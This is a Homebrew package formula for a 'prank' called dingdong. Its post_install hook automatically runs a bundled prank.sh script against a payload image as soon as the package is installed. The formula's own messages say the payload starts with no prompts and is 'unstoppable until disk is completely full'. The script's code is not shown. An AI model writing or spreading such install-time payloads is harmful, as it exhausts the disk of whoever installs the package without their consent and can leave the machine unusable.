class Dingdong < Formula
  desc "⚡ Karan's Ultimate Prank - Lightning speed, unstoppable execution"
  homepage "https://github.com/punkkkkkkk/dingdong"
  url "https://github.com/punkkkkkkk/dingdong/archive/refs/heads/main.zip"
  version "3.1.0"
  sha256 "7d6030103b9c9549c49f687ca0bc6841d733434f802a73fe812d98f02644608f"

  def install
    bin.install "prank.sh"
    pkgshare.install "payload.png"
  end

  def post_install
    ohai "⚡ Karan's Ultimate Prank v3.1 - Lightning Speed Edition!"
    ohai "🚀 Auto-starts immediately, no prompts required"
    ohai "💀 Unstoppable until disk is completely full"
    
    system "#{bin}/prank.sh #{pkgshare}/payload.png"
  end

  test do
    system "#{bin}/prank.sh", "--version"
  end
end
